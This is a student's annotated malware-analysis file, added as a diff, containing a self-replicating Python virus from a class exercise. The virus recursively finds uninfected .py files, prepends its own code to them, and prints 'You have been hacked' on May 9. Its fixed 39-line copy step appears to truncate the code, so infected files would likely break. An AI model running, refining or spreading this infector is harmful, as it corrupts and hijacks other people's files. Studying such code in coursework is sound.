@@ -1,0 +1,58 @@
+#!/usr/bin/python3
+
+#Renee Stanley
+#ops-301d9: Python Malware Analysis
+
+#Here I am copying some malicious code used as an example in my class and will attempt to analyze it.
+
+ #import modules
+import os
+import datetime
+
+ #declare vaiables
+SIGNATURE = "VIRUS"
+
+ ##a function to find python files suitable for infection in the target's directories. This function creates an empty list, then when it finds files that meet the conditions (i.e. python file extension, not already infected as per SIGNATURE start flag). This function works recursively as it will determine if it is working in a directory or not. If so, it digs deeper.
+  
+def locate(path):
+    files_targeted = []
+    filelist = os.listdir(path)
+    for fname in filelist:
+        if os.path.isdir(path+"/"+fname):
+            files_targeted.extend(locate(path+"/"+fname))
+        elif fname[-3:] == ".py":
+            infected = False
+            for line in open(path+"/"+fname):
+                if SIGNATURE in line:
+                    infected = True
+                    break
+            if infected == False:
+                files_targeted.append(path+"/"+fname)
+    return files_targeted
+
+ ##this function opens the virus in the absolute path of the current working directory. It sets itself up by making a space for the virus code and adds a blank line (+= line), which will be added to each of the files in the files_targeted list BEFORE the targeted file code (prepending with virusstring + temp). The virus code will always run before initial python code whenever the infected file is run.
+  
+def infect(files_targeted):
+    virus = open(os.path.abspath(__file__))
+    virusstring = ""
+    for i,line in enumerate(virus):
+       if 0 <= i < 39:
+            virusstring += line 
+    virus.close
+    for fname in files_targeted:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname,"w")
+        f.write(virusstring + temp)
+        f.close()
+
+  #this function defines the payload (printing "You have been hacked") that will execute on a specific date, this one being May 9th. 
+def detonate():
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        print("You have been hacked")
+
+#RUNTHATSCRIPT
+files_targeted = locate(os.path.abspath(""))
+infect(files_targeted)
+detonate()
